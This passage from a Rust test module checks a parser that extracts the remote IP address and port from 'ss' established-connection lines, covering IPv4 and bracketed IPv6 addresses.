                "{ip} should be treated as public"
            );
        }
    }

    #[cfg(unix)]
    #[test]
    fn parses_remote_addr_port_from_ss_established_line() {
        assert_eq!(
            parse_remote_addr_port("ESTAB 0 0 192.168.1.5:52341 203.0.113.9:4444", 4),
            Some(("203.0.113.9".parse().unwrap(), 4444))
        );
    }

    #[cfg(unix)]
    #[test]
    fn parses_remote_addr_port_handles_bracketed_ipv6() {
        assert_eq!(
            parse_remote_addr_port("ESTAB 0 0 [::1]:52341 [2001:db8::1]:4444", 4),
            Some(("2001:db8::1".parse().unwrap(), 4444))
        );
    }
}
